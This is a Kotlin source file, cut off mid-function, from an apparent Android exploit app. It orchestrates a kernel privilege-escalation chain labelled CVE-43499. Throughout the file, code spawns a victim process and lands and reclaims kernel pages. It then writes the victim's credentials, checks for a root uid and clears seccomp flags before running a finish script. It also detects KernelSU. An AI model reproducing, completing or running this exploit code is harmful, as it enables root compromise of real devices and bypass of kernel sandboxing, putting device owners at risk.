package com.ghostlock.app.backend.backends.cve43499.flow

import com.ghostlock.app.backend.backends.cve43499.finish.AndroidFinishEvidenceSource
import com.ghostlock.app.backend.backends.cve43499.finish.FinishAcceptance
import com.ghostlock.app.backend.backends.cve43499.finish.FinishAcceptanceInput
import com.ghostlock.app.backend.backends.cve43499.finish.FinishCommandSource
import com.ghostlock.app.backend.backends.cve43499.finish.FinishEvidenceSource
import com.ghostlock.app.backend.backends.cve43499.finish.FinishExecutionEvidence
import com.ghostlock.app.backend.backends.cve43499.finish.FinishHandoff
import com.ghostlock.app.backend.backends.cve43499.finish.FinishVerdict
import com.ghostlock.app.backend.backends.cve43499.finish.ProcessBuilderFinishCommandSource
import com.ghostlock.app.backend.backends.cve43499.finish.RunBindingEvidence
import com.ghostlock.app.backend.backends.cve43499.finish.runBindingEvidence
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499ActorExecuteStep
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499ActorPrepareStep
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499ChainCloseReceipt
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499LandingStep
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499Lifecycle
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499LifecycleApi
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499LifecycleReceipt
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499PlacementStep
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499UidProbe
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499VictimSnapshot
import com.ghostlock.app.backend.backends.cve43499.owned.ActorPreparation
import com.ghostlock.app.backend.backends.cve43499.owned.FailStopController
import com.ghostlock.app.backend.backends.cve43499.owned.KernelsuGuardResult
import com.ghostlock.app.backend.backends.cve43499.owned.ProcessLimits
import com.ghostlock.app.backend.backends.cve43499.owned.ProcessLimitsOutcome
import com.ghostlock.app.core.flow.FlowStep
import com.ghostlock.app.core.flow.RetryPolicy
import com.ghostlock.app.core.flow.SequentialFlow
import com.ghostlock.app.core.flow.StepContext
import com.ghostlock.app.core.flow.StepResult
import com.ghostlock.app.core.flow.StepTiming
import com.ghostlock.app.core.flow.FlowProgress
import com.ghostlock.app.backend.backends.cve43499.victim.VictimFinishResult
import com.ghostlock.app.backend.backends.cve43499.w3.Cve43499W3HardGate
import com.ghostlock.app.jni.Native43499PrimitiveSpec
import kotlinx.coroutines.delay

/**
 * 一次运行的物理事实回执（不含任何业务成功主张）。
 *
 * @property placementRounds Placement 实际测量轮数。
 * @property landingReclaimSends landing 实际 reclaim sendmsg 次数。
 * @property actorConsumerSuccess execute 窗口内 consumer 成功计数。
 * @property victimUid victim 读回的 uid；null 表示没有证据。
 * @property victimStartTimeTicks execute 前采集的 victim starttime（绑定证据）。
 * @property executionExitCode 收尾脚本实际退出码；null 表示未执行/未拿到。
 * @property termination 生命周期层 closeAll 的具名终结证据。
 * @property verdict 收尾验收结论（全部证据齐备才是 Accepted）。
 * @property writeEvidence R3d 多写链的阶段证据（attempts/目标派生/路由回执）。
 * @property retained 是否有 Native 保留闭包（dirty/retained；不伪报释放）。
 * @property rootedChildParked true=rooted victim 按 task-45 只 detach（park 驻留，不杀）。
 * @note 阶段：task-33；R3d 起聚合多写链证据。
 */
internal data class Cve43499RunReceipts(
    val runId: String,
    val placementRounds: Long,
    val landingReclaimSends: Long,
    val actorConsumerSuccess: Long,
    val victimUid: Long?,
    val victimStartTimeTicks: Long?,
    val executionExitCode: Int?,
    val termination: String,
    val verdict: FinishVerdict,
    val writeEvidence: Map<String, String>,
    val retained: Boolean,
    val rootedChildParked: Boolean,
)

/**
 * 一次运行在 steps() 内创建、被各 step lambda 捕获的共享状态。
 *
 * @property runSpec 本次运行的显式输入。
 * @property lifecycle 唯一的资源生命周期管理层（steps() 内创建一次，cleanup 兜底 closeAll）。
 * @note 只随本次 Flow 实例存活（SequentialFlow 一次性），不是全局/单例。
 */
private class Cve43499FlowRunState(
    val runSpec: Flow43499RunSpec,
    val lifecycle: Cve43499LifecycleApi,
    val progress: FlowProgress = FlowProgress.NONE,
    /** W3 硬门实例（生产默认；单测注入 fake）。 */
    val w3Gate: Cve43499W3HardGate = Cve43499W3HardGate(),
) {
    val runId: String = runSpec.runId

    /** Info 里程碑（无参数细节）。 */
    fun info(message: String) = Cve43499RunLog.info(progress, message)

    /** Debug 分支/细节（不进 UI）。 */
    fun debug(message: String) = Cve43499RunLog.debug(progress, message)

    /** Warn（单一 reason，非空且不与 message 同义）。 */
    fun warn(message: String, reason: String) = Cve43499RunLog.warn(progress, message, reason)

    /** Error（单一 reason，非空且不与 message 同义）。 */
    fun error(message: String, reason: String) = Cve43499RunLog.error(progress, message, reason)
    var victimBefore: Cve43499VictimSnapshot? = null
    var victimAfter: Cve43499VictimSnapshot? = null
    var placementFacts: Cve43499PlacementFacts? = null
    var generatedPrimitive: Native43499PrimitiveSpec? = null
    var placementRounds: Long = 0L
    var landingReclaimSends: Long = 0L
    var actorConsumerSuccess: Long = 0L
    var observedUid: Long? = null
    var execution: FinishExecutionEvidence? = null
    var termination: String = "not-attempted"
    var resourcesReleased: Boolean = false
    var retainedResources: Boolean = false
    var rootedChildParked: Boolean = false
    var closed: Boolean = false

    /** G01：本次 run 的 fail-stop 控制器（lazy；只在首次 retained 时创建）。 */
    var failStop: FailStopController? = null

    /* ---- G05 prebuilt repair 状态（W2 cred 写成功后 close 合同用） ---- */
    /** W2 cred 写成功（uid 判定前）；成功后所有 close 必须过 requireCleanCloseAfterCred。 */
    var w2CredWriteSucceeded: Boolean = false

    /** W1 出口 prebuild clean failure 的具名原因（null=未失败/未启用）。 */
    var prebuildFailedReason: String? = null

    /* ---- G04 W3 硬门 ---- */
    /** W3 硬门前置/证据是否 PASS（finish 前置要求；单 W1/非 root N/A）。 */
    var w3GatePassed: Boolean = false

    /* ---- B6 finish 派发前证据 ---- */
    var finishEnforceBefore: Int? = null
    var finishEnforceAfter: Int? = null

    /* ---- R3d 多写链状态 ---- */
    var writeRunner: Cve43499WriteTransactionRunner? = null
    var w1Facts: Cve43499PlacementFacts? = null
    var victimTaskAddress: Long? = null
    var bindingPrimitive: Native43499PrimitiveSpec? = null

    /** 当前已打开写链数（Executed 后链保持打开；closeChain 递减）。 */
    var openChains: Int = 0

    /** 多写链阶段证据（key 稳定可检索；验收/回执合并输出）。 */
    val writeEvidence: MutableMap<String, String> = linkedMapOf()
}

/**
 * 43499 的 Flow 实现：**唯一编排层**（task-32 三层架构）+ **多 step 架构**（task-33）
 * + **R3d 多写链**（W1 → W1b → W2(+fast-repair) → W3）。
 *
 * 层级约束：
 * ```
 * Flow43499Impl（唯一编排；本文件多个具名 step / 多写链）
 *   → Cve43499Lifecycle（唯一生命周期管理层：多写链 + victim）
 *   → Native43499Jni（owners 内部）
 * ```
 *
 * 单 W1 兼容模式（`runSpec.writeChain == null`，R3b 历史路径）：
 * 1. `cve43499.request.validate`
 * 2. `cve43499.victim.start`
 * 3. `cve43499.placement.prepare` → 4. `cve43499.page.land` → 5. `cve43499.actor.prepare`
 * → 6. `cve43499.actor.execute` → 7. `cve43499.victim.probe` → 8. `cve43499.finish.execute`
 * → 9. `cve43499.lifecycle.close` → 10. `cve43499.acceptance`
 *
 * R3d 多写链模式（`runSpec.writeChain != null`）：
 * 1. `cve43499.request.validate`（策略/生成器校验、写事务执行器构建）
 * 2. `cve43499.write.w1`（attempts 循环；每次 = 新 placement→landing→actor 事务；
 *    multicast 按 legacy 固定 1 次）
 * 3. `cve43499.victim.start`（legacy：W1 之后才 spawn victim）
 * 4. `cve43499.write.w1b`（multicast 私有 scratch 修复；结束后关闭 W1 链=释放 quarantine）
 * 5. `cve43499.write.w2`（Credential 写 attempts + fast-repair 修复事务 + uid 判定）
 * 6. `cve43499.victim.probe`（execute 后身份复查 + uid）
 * 7. `cve43499.write.w3`（leaf 方向探针 + TIF_SECCOMP/seccomp.mode 清零 + 链轮次）
 * 8. `cve43499.finish.execute` → 9. `cve43499.lifecycle.close` → 10. `cve43499.acceptance`
 *
 * pselect 重喷页：多写链的每一次 attempt 都是新的 placement→landing 事务（新页/新
 * fd_set 帧），不在 Native 内实现重喷状态机。
 *
 * 兼容分支（历史请求形状，保持既有冻结字符串）：
 * - `runSpec == null` ⇒ 单 step Failed `cve43499-flow-not-wired`；
 * - `runSpec.runId` 空白 ⇒ 单 step Failed `cve43499-run-request-missing`（evidence 带 runId）。
 *
 * @note 不新增可写全局/单例，不接默认 backend runner 或 UI 入口；真机未验证。
 */
class Flow43499Impl internal constructor(
    private val lifecycleFactory: () -> Cve43499LifecycleApi,
    private val specLifecycleFactory: ((Flow43499RunSpec) -> Cve43499LifecycleApi)? = null,
    /** W3 硬门工厂（生产默认；单测可注入 fake gate，不改变生产语义）。 */
    private val w3GateFactory: () -> Cve43499W3HardGate = { Cve43499W3HardGate() },
) : SequentialFlow<Flow43499Request>(Flow43499Impl::class) {
    /**
     * 生产路径：唯一生命周期层的默认实现。
     *
     * @note R4/批 B2：`runSpec.victimFactory` 非 null（`injection.victim=jni-spawn`）时
     *   用其构造 lifecycle；否则保持默认 `ProcessVictimSession` 路径（行为不变）。
     */
    /**
     * 测试/兼容构造：只注入 lifecycle（无 spec 级工厂）。
     *
     * @param lifecycleFactory 生命周期工厂。
     */
    internal constructor(lifecycleFactory: () -> Cve43499LifecycleApi) :
        this(lifecycleFactory, null, { Cve43499W3HardGate() })

    constructor() : this(
        lifecycleFactory = { Cve43499Lifecycle() },
        specLifecycleFactory = { spec ->
            val victimFactory = spec.victimFactory
            if (victimFactory == null) {
                Cve43499Lifecycle()
            } else {
                Cve43499Lifecycle(victimFactory)
            }
        },
        w3GateFactory = { Cve43499W3HardGate() },
    )

    /** 本次实例的活动运行状态（steps() 写入，cleanup() 兜底读取）。 */
    private var activeRun: Cve43499FlowRunState? = null

    override fun steps(request: Flow43499Request): List<FlowStep> {
        val runSpec = request.runSpec
        if (runSpec == null) {
            /* 历史请求形状：保持既有 fail-closed 契约（兼容既有 flow 测试）。 */
            return listOf(
                step(STEP_LEGACY) {
                    StepResult.Failed(REASON_LEGACY_NOT_WIRED)
                },
            )
        }
        if (runSpec.runId.isBlank()) {
            return listOf(
                step(STEP_RUN_REQUEST) {
                    StepResult.Failed(
                        REASON_RUN_REQUEST_MISSING,
                        mapOf(EVIDENCE_RUN_ID to runSpec.runId),
                    )
                },
            )
        }
        val lifecycle = specLifecycleFactory?.invoke(runSpec) ?: lifecycleFactory()
        val run = Cve43499FlowRunState(runSpec, lifecycle, request.progress, w3GateFactory())
        activeRun = run
        run.info("run start")
        run.debug("run start runId=" + shortRunId(run.runId))
        return if (runSpec.writeChain != null) {
            writeChainSteps(run)
        } else {
            singleWriteSteps(run)
        }
    }

    /* ==================================================================== */
    /* 单 W1 兼容模式（R3b 历史路径，行为保持不变）                          */
    /* ==================================================================== */

    /**
     * @param run 本次运行状态。
     * @return R3b 单 W1 的 10 步列表（历史兼容路径）。
     */
    private fun singleWriteSteps(run: Cve43499FlowRunState): List<FlowStep> = listOf(
        /* 1. 输入校验：G06/G07 前置检查 + 冻结本次 run 的配置来源与 runId。 */
        step(STEP_REQUEST_VALIDATE) { singleWriteValidateStep(run) },
        /* 2. victim 先启动：内核写入窗口期间目标进程必须存在。 */
        step(STEP_VICTIM_START) { victimStartStep(run) },
        /* 3. Placement 定位事务：回传 facts 供落页前生成 landing/primitive。 */
        step(STEP_PLACEMENT_PREPARE) {
            when (val prepared = run.lifecycle.preparePlacement(run.runSpec.placement)) {
                is Cve43499PlacementStep.Prepared -> {
                    run.placementRounds = prepared.rounds
                    run.placementFacts = prepared.facts
                    StepResult.Done(
                        linkedMapOf(
                            EVIDENCE_PLACEMENT_ROUNDS to prepared.rounds.toString(),
                            EVIDENCE_CANDIDATE_PAGE_BASE to
                                formatAddress(prepared.facts.candidatePageBase),
                        ),
                    )
                }
                is Cve43499PlacementStep.Failed ->
                    StepResult.Failed("cve43499:placement.prepare:" + prepared.reason)
            }
        },
        /* 4. landing：Placement → Page；landing 由 post-placement seam 从 facts 生成。 */
        step(STEP_PAGE_LAND) { singleWriteLandStep(run) },
        /* 5. prepareActor：Page → Actor；primitive 优先用 post-placement 生成值。 */
        step(STEP_ACTOR_PREPARE) { singleWritePrepareActorStep(run) },
        /* 6. execute：唯一一次 PI 窗口。 */
        step(STEP_ACTOR_EXECUTE) { singleWriteExecuteStep(run) },
        /* 7. execute 后身份复查 + uid 探测（只做证据，不宣布成功）。 */
        step(STEP_VICTIM_PROBE) { victimProbeStep(run) },
        /* 8. 有界执行收尾脚本（只在攻击链成功时执行生产脚本）。 */
        step(STEP_FINISH_EXECUTE) { finishExecuteStep(run) },
        /* 9. 终结整链（cleanup() 兜底同一入口；这一步显式给出终结证据）。 */
        step(STEP_LIFECYCLE_CLOSE) { lifecycleCloseStep(run) },
        /* 10. 收尾验收：六项具名判定 + 汇总 evidence。 */
        step(STEP_ACCEPTANCE) { acceptanceStep(run) },
    )

    /**
     * 单 W1 模式的落页 step（R3b 数据流：facts → generator → landing）。
     *
     * @param run 本次运行状态。
     * @return Done/Failed。
     */
    private fun singleWriteLandStep(run: Cve43499FlowRunState): StepResult {
        val facts = run.placementFacts
            ?: return StepResult.Failed("cve43499:page.land:placement-facts-missing")
        val generator = run.runSpec.postPlacementGenerator
        val generated: Cve43499GeneratedInputs? = if (generator != null) {
            try {
                generator.generate(facts)
            } catch (problem: Exception) {
                return StepResult.Failed(
                    "cve43499:page.land:post-placement-generator:" +
                        (problem.message ?: problem.javaClass.simpleName),
                )
            }
        } else {
            null
        }
        val landing = generated?.landing ?: run.runSpec.frozenInputs?.landing
            ?: return StepResult.Failed("cve43499:page.land:landing-input-missing")
        if (generated != null) {
            run.generatedPrimitive = generated.primitive
        }
        return when (val landed = run.lifecycle.landPage(landing)) {
            is Cve43499LandingStep.Landed -> {
                run.landingReclaimSends = landed.reclaimSends
                StepResult.Done(
                    linkedMapOf(
                        EVIDENCE_LANDING_RECLAIM_SENDS to landed.reclaimSends.toString(),
                        EVIDENCE_LANDING_SOURCE to
                            if (generated != null) {
                                LANDING_SOURCE_POST_PLACEMENT
                            } else {
                                LANDING_SOURCE_FROZEN
                            },
                    ),
                )
            }
            is Cve43499LandingStep.Failed ->
                StepResult.Failed("cve43499:page.land:" + landed.reason)
            is Cve43499LandingStep.CleanFailure ->
                StepResult.Failed("cve43499:page.land:" + landed.reason)
            is Cve43499LandingStep.ConsumedDirty ->
                StepResult.Failed("cve43499:page.land:" + landed.reason)
        }
    }

    /**
     * 单 W1 模式的 prepareActor step。
     *
     * @param run 本次运行状态。
     * @return Done/Failed。
     */
    private fun singleWritePrepareActorStep(run: Cve43499FlowRunState): StepResult {
        val primitive = run.generatedPrimitive
            ?: run.runSpec.frozenInputs?.primitive
            ?: return StepResult.Failed("cve43499:actor.prepare:primitive-input-missing")
        val preparation = ActorPreparation(
            setup = run.runSpec.actorSetup,
            primitive = primitive,
        )
        return when (val prepared = run.lifecycle.prepareActor(preparation)) {
            is Cve43499ActorPrepareStep.Prepared -> StepResult.Done(
                linkedMapOf(EVIDENCE_ACTOR_PRIMITIVE_KIND to prepared.primitiveKind),
            )
            is Cve43499ActorPrepareStep.Failed ->
                StepResult.Failed("cve43499:actor.prepare:" + prepared.reason)
            is Cve43499ActorPrepareStep.CleanFailure ->
                StepResult.Failed("cve43499:actor.prepare:" + prepared.reason)
            is Cve43499ActorPrepareStep.ConsumedDirty ->
                StepResult.Failed("cve43499:actor.prepare:" + prepared.reason)
        }
    }

    /**
     * 单 W1 模式的 execute step。
     *
     * @param run 本次运行状态。
     * @return Done/Failed。
     */
    private fun singleWriteExecuteStep(run: Cve43499FlowRunState): StepResult =
        when (val executed = run.lifecycle.executeActor()) {
            is Cve43499ActorExecuteStep.Executed -> {
                if (executed.facts.retainedForProcessExit) {
                    /* G01：单 W1 路径 Actor retained ⇒ dirty fail-stop。 */
                    markRetained(run, "actor.execute", "retained-for-process-exit")
                    StepResult.Failed("cve43499:actor.execute:retained-for-process-exit")
                } else {
                    run.actorConsumerSuccess = executed.consumerSuccess
                    StepResult.Done(
                        linkedMapOf(
                            EVIDENCE_ACTOR_CONSUMER_SUCCESS to
                                executed.consumerSuccess.toString(),
                        ),
                    )
                }
            }
            is Cve43499ActorExecuteStep.Failed ->
                StepResult.Failed("cve43499:actor.execute:" + executed.reason)
            is Cve43499ActorExecuteStep.CleanFailure ->
                StepResult.Failed("cve43499:actor.execute:" + executed.reason)
            is Cve43499ActorExecuteStep.ConsumedDirty -> {
                markRetained(run, "actor.execute", executed.reason)
                StepResult.Failed("cve43499:actor.execute:" + executed.reason)
            }
        }

    /* ==================================================================== */
    /* R3d 多写链模式                                                       */
    /* ==================================================================== */

    /**
     * @param run 本次运行状态（`runSpec.writeChain != null`）。
     * @return R3d 多写链的 10 步列表。
     */
    private fun writeChainSteps(run: Cve43499FlowRunState): List<FlowStep> = listOf(
        step(STEP_REQUEST_VALIDATE) { writeChainValidateStep(run) },
        step(STEP_WRITE_W1) { writeW1Step(run) },
        step(STEP_VICTIM_START) { victimStartStep(run) },
        step(STEP_WRITE_W1B) { writeW1bStep(run) },
        step(STEP_WRITE_W2) { writeW2Step(run) },
        step(STEP_VICTIM_PROBE) { victimProbeStep(run) },
        step(STEP_WRITE_W3) { writeW3Step(run) },
        step(STEP_FINISH_EXECUTE) { finishExecuteStep(run) },
        step(STEP_LIFECYCLE_CLOSE) { lifecycleCloseStep(run) },
        step(STEP_ACCEPTANCE) { acceptanceStep(run) },
    )

    /**
     * 多写链输入校验：策略自洽 + 生成器必须实现按请求生成 seam。
     *
     * @param run 本次运行状态。
     * @return Done（runId/writeMode/primitive）/ 具名 Failed。
     */
    private fun writeChainValidateStep(run: Cve43499FlowRunState): StepResult {
        val chain = run.runSpec.writeChain
            ?: return StepResult.Failed("cve43499:request.validate:write-chain-missing")
        val generator = run.runSpec.writeGenerator
            ?: return StepResult.Failed(
                "cve43499:request.validate:write-generator-missing",
            )
        chain.policy.validate()?.let { reason ->
            return StepResult.Failed("cve43499:request.validate:" + reason)
        }
        preflight(run)?.let { reason ->
            return StepResult.Failed(
                "cve43499:request.validate:" + reason,
                run.writeEvidence.toMap() + retainedEvidence(run),
            )
        }
        if (run.runSpec.expectedUid < 0L) {
            return StepResult.Failed("cve43499:write.chain:expected-uid-invalid")
        }
        run.writeRunner = Cve43499WriteTransactionRunner(
            lifecycle = run.lifecycle,
            writeGenerator = generator,
            placement = run.runSpec.placement,
            actorSetup = run.runSpec.actorSetup,
            policy = chain.policy,
            elapsedRealtimeNanos = run.runSpec.elapsedRealtimeNanos,
        )
        return StepResult.Done(
            linkedMapOf(
                EVIDENCE_RUN_ID to run.runId,
                EVIDENCE_WRITE_MODE to WRITE_MODE_CHAIN,
                EVIDENCE_PRIMITIVE to chain.primitiveToken,
            ).apply { putAll(run.writeEvidence) },
        )
    }

    /**
     * G06/G07 W1 前置检查（两种模式共享；validate step 内、W1 之前）。
     *
     * 顺序：先 KSU 守卫（loaded ⇒ refuse），再 RLIMIT 抬升（失败 ⇒ refuse）。
     * 成功/读数写入 `run.writeEvidence`，随 validate Done evidence 合并。
     *
     * @param run 本次运行状态。
     * @return null=通过；否则具名失败 reason（`ksu-loaded:*`/`process-limits:*`）。
     * @note 两个 seam 均为 null 时完全 no-op（既有 fake 测试行为不变）。
     */
    private fun preflight(run: Cve43499FlowRunState): String? {
        val ksuCheck = run.runSpec.ksuCheck
        if (ksuCheck != null) {
            val result = try {
                ksuCheck()
            } catch (problem: Throwable) {
                return "ksu-guard-failed:" + problem.javaClass.simpleName
            }
            when (result) {
                is KernelsuGuardResult.Loaded -> {
                    run.writeEvidence[EVIDENCE_KSU_GUARD] = "loaded"
                    run.writeEvidence[EVIDENCE_KSU_SIGNAL] = result.signal
                    result.evidence.forEach { (key, value) ->
                        run.writeEvidence["ksu." + key] = value
                    }
                    return "ksu-loaded:" + result.signal
                }
                is KernelsuGuardResult.Absent -> {
                    run.writeEvidence[EVIDENCE_KSU_GUARD] = "absent"
                    result.evidence.forEach { (key, value) ->
                        run.writeEvidence["ksu." + key] = value
                    }
                }
            }
        }
        val processLimits = run.runSpec.processLimitsRaiser
        if (processLimits != null) {
            val outcome = try {
                processLimits()
            } catch (problem: Throwable) {
                return "process-limits:jni:" + problem.javaClass.simpleName
            }
            when (outcome) {
                is ProcessLimitsOutcome.Failed -> return outcome.reason
                is ProcessLimitsOutcome.Raised ->
                    run.writeEvidence.putAll(ProcessLimits.evidence(outcome))
            }
        }
        return null
    }

    /**
     * 单 W1 兼容模式的输入校验 step（G06/G07 前置 + 冻结 runId）。
     *
     * @param run 本次运行状态。
     * @return Done（runId/writeMode + 前置 evidence）或具名 Failed。
     */
    private fun singleWriteValidateStep(run: Cve43499FlowRunState): StepResult {
        preflight(run)?.let { reason ->
            return StepResult.Failed(
                "cve43499:request.validate:" + reason,
                run.writeEvidence.toMap(),
            )
        }
        return StepResult.Done(
            linkedMapOf(
                EVIDENCE_RUN_ID to run.runId,
                EVIDENCE_WRITE_MODE to WRITE_MODE_SINGLE,
            ).apply { putAll(run.writeEvidence) },
        )
    }

    /**
     * W1 step：attempts 循环，每次 = 新 placement→landing→actor 事务；成功后链保持
     * 打开（W1b 修复需要页仍被持有），验收通过后才进入下一阶段。
     *
     * @param run 本次运行状态。
     * @return Done（w1Attempts/candidatePageBase 证据）/ 具名 Failed。
     */
    private suspend fun writeW1Step(run: Cve43499FlowRunState): StepResult {
        val chain = run.runSpec.writeChain ?: return missingChain()
        val runner = run.writeRunner ?: return missingRunner()
        val request = chain.planner.w1()
        var lastReason = "no-attempt"
        var lastWasVerifyUnverified = false
        /* Debug 分支：进入 W1（每分支恰好一条；不在每轮重试打印）。 */
        run.debug("w1 start attempts=" + chain.policy.w1Attempts)
        for (attempt in 1..chain.policy.w1Attempts) {
            when (val outcome = runner.execute(Cve43499WriteStageId.W1, request)) {
                is Cve43499WriteTransactionStep.Executed -> {
                    run.placementFacts = outcome.facts
                    run.w1Facts = outcome.facts
                    run.actorConsumerSuccess = outcome.consumerSuccess
                    run.landingReclaimSends = outcome.reclaimSends
                    /* 事务已返回：允许日志（PI 窗口外）；参数细节只进 Debug。 */
                    run.debug("w1 placement rounds=" + run.placementRounds)
                    run.debug("w1 land reclaimSends=" + outcome.reclaimSends)
                    run.debug(
                        "w1 actor consumerSuccess=" + outcome.consumerSuccess +
                            " prim=" + outcome.primitiveKind,
                    )
                    when (chain.verifier.verifyW1()) {
                        Cve43499WriteVerifyVerdict.VERIFIED -> {
                            markExecuted(run, outcome.primitive)
                    /* task-84：接线 w1SettleUs（此前死字段；W1 成功后 settle 再验收）。 */
                    settleUs(chain.policy.w1SettleUs)
                            run.writeEvidence[EVIDENCE_W1_VERIFY] = W1_VERIFY_VERIFIED
                            recordW1CarrierEvidence(run, attempt, outcome)
                            run.info("w1 verify ok")
                            run.debug("w1 verify=VERIFIED")
                            return w1DoneStep(
                                run,
                                attempt,
                                run.w1Facts!!,
                                W1_VERIFY_VERIFIED,
                                reason = null,
                            )
                        }
                        Cve43499WriteVerifyVerdict.UNSUPPORTED -> {
                            /* task-45 B1：W1 墙拆除。本环境没有可用判据不是物理失败；
                             * 保留 W1 facts/链（W1b quarantine 需要），继续 W1b/W2/W3。 */
                            markExecuted(run, outcome.primitive)
                            lastWasVerifyUnverified = false
                            lastReason = "verify-unsupported"
                            val unsupportedReason =
                                chain.verifier.w1UnsupportedReason() ?: "no-verifier"
                            run.writeEvidence[EVIDENCE_W1_VERIFY] = W1_VERIFY_UNSUPPORTED
                            run.writeEvidence[EVIDENCE_W1_VERIFY_REASON] = unsupportedReason
                            recordW1CarrierEvidence(run, attempt, outcome)
                            run.warn("w1 verify unsupported", unsupportedReason)
                            return w1DoneStep(
                                run,
                                attempt,
                                run.w1Facts!!,
                                W1_VERIFY_UNSUPPORTED,
                                reason = unsupportedReason,
                            )
                        }
                        Cve43499WriteVerifyVerdict.UNVERIFIED -> {
                            markExecuted(run, outcome.primitive)
                            lastWasVerifyUnverified = true
                            lastReason = "verify-unverified"
                            if (attempt < chain.policy.w1Attempts) {
                                /* 重试语义保持：关掉本轮链，下一 attempt 重新落页。 */
                                closeLatestChain(run)
                                run.placementFacts = null
                                run.w1Facts = null
                                settleUs(chain.policy.verifyBackoffUs)
                            } else {
                                /* task-45 B2：耗尽后不因“无法验证”硬失败；保留最后一条
                                 * 链/facts（W1b 需要页仍被持有）并继续后续步骤。 */
                                run.writeEvidence[EVIDENCE_W1_VERIFY] = W1_VERIFY_UNVERIFIED
                                run.writeEvidence[EVIDENCE_W1_VERIFY_REASON] = "verify-unverified"
                                recordW1CarrierEvidence(run, attempt, outcome)
                                run.warn("w1 verify unverified", "verify-unverified")
                                return w1DoneStep(
                                    run,
                                    attempt,
                                    run.w1Facts!!,
                                    W1_VERIFY_UNVERIFIED,
                                    reason = "verify-unverified",
                                )
                            }
                        }
                    }
                }
                is Cve43499WriteTransactionStep.RouteMiss -> {
                    /* RouteMiss 语义不变（仍按尝试耗尽失败）。 */
                    lastWasVerifyUnverified = false
                    lastReason = outcome.reason
                    settleUs(chain.policy.attemptBackoffUs)
                }
                is Cve43499WriteTransactionStep.Failed -> {
                    if (outcome.retained) markRetained(run, "write.w1", outcome.reason)
                    return StepResult.Failed(outcome.reason, retainedEvidence(run))
                }
            }
        }
        if (lastWasVerifyUnverified) {
            /* 防御路径：最后一次 UNVERIFIED 已在循环内返回；理论不可达，保守继续。 */
            run.writeEvidence[EVIDENCE_W1_VERIFY] = W1_VERIFY_UNVERIFIED
            run.writeEvidence[EVIDENCE_W1_VERIFY_REASON] = lastReason
            return StepResult.Done(
                linkedMapOf(EVIDENCE_W1_VERIFY to W1_VERIFY_UNVERIFIED),
            )
        }
        return StepResult.Failed(
            "cve43499:write.w1:unverified:" + lastReason,
            retainedEvidence(run),
        )
    }

    /**
     * 记录 W1 Carrier 回执证据（attempts/carrier 中性计数）。
     *
     * @param run 本次运行状态。
     * @param attempt 第几次 W1 尝试（1-based）。
     * @param outcome 写事务结局。
     */
    private fun recordW1CarrierEvidence(
        run: Cve43499FlowRunState,
        attempt: Int,
        outcome: Cve43499WriteTransactionStep.Executed,
    ) {
        run.writeEvidence[EVIDENCE_W1_ATTEMPTS] = attempt.toString()
        run.writeEvidence[EVIDENCE_W1_CARRIER] =
            outcome.primitiveKind + "/" +
                outcome.carrierOperations + "/" +
                outcome.carrierLastStep + "/" +
                outcome.carrierLastErrno
    }

    /**
     * W1 非阻断（VERIFIED/UNSUPPORTED/UNVERIFIED 耗尽）的 Done evidence。
     *
     * @param attempt 实际 attempt 数。
     * @param facts 保留的 W1 事实（W1b 修复使用）。
     * @param verify W1 判据 token（verified/unsupported/unverified）。
     * @param reason 判据非 VERIFIED 时的具名原因（evidence `w1VerifyReason`）。
     * @return Done（attempts/candidatePageBase/w1Verify[+reason]）。
     */
    private fun w1DoneStep(
        run: Cve43499FlowRunState,
        attempt: Int,
        facts: Cve43499PlacementFacts,
        verify: String,
        reason: String?,
    ): StepResult {
        val evidence = linkedMapOf(
            EVIDENCE_W1_ATTEMPTS to attempt.toString(),
            EVIDENCE_CANDIDATE_PAGE_BASE to formatAddress(facts.candidatePageBase),
            EVIDENCE_W1_VERIFY to verify,
        )
        if (reason != null) evidence[EVIDENCE_W1_VERIFY_REASON] = reason
        return StepResult.Done(evidence)
    }

    /**
     * G05（Q1=B，task-73）：**W1b 成功出口**预建 repair 链（placement+landing；Actor 不预建）。
     *
     * clean failure ⇒ W1b 继续（W2 按 allowFullFallback 判定）；dirty/retained ⇒ W1b
     * 立即 fail-stop，不进 W2（W1b dirty 由既有失败路径先处理，本预建不会执行）。
     *
     * @param run 本次运行状态。
     * @param evidence W1b Done 证据（成功时并入 prebuild 字段）。
     * @return null=可继续；非 null=W1b 立即 Failed（dirty/retained prebuild）。
     */
    private fun prebuildRepairAtW1bExit(
        run: Cve43499FlowRunState,
        evidence: MutableMap<String, String>,
    ): StepResult? {
        val chain = run.runSpec.writeChain ?: return null
        if (!chain.policy.fastRepairPrebuildEnabled) {
            run.writeEvidence[EVIDENCE_W2_REPAIR_MODE] = W2_REPAIR_MODE_NONE
            return null
        }
        val runner = run.writeRunner
            ?: return StepResult.Failed(
                "cve43499:write.w1b:fast-repair-prebuild-runner-missing",
                retainedEvidence(run),
            )
        val start = run.runSpec.elapsedRealtimeNanos()
        val outcome = runner.prebuildRepair(
            Cve43499WriteStageId.W2_REPAIR,
            chain.planner.fastRepair(),
        )
        val elapsedUs = (run.runSpec.elapsedRealtimeNanos() - start) / 1_000L
        evidence[EVIDENCE_PREBUILD_US] = elapsedUs.toString()
        run.writeEvidence[EVIDENCE_PREBUILD_US] = elapsedUs.toString()
        return when (outcome) {
            is Cve43499PrebuildStep.Ready -> {
                evidence[EVIDENCE_PREBUILT_STATE] = PREBUILT_STATE_PAGE_READY
                run.writeEvidence[EVIDENCE_PREBUILT_STATE] = PREBUILT_STATE_PAGE_READY
                null
            }
            is Cve43499PrebuildStep.Failed -> {
                return if (outcome.retained) {
                    /* dirty/retained ⇒ W1 立即 fail-stop（不进 W1b/W2）；failStop.enabled=0
                     * 时仍返回 Failed（B1 不依赖终止）。 */
                    evidence[EVIDENCE_PREBUILT_STATE] = PREBUILT_STATE_RETAINED
                    evidence[EVIDENCE_W2_REPAIR_MODE] = "prebuild-retained"
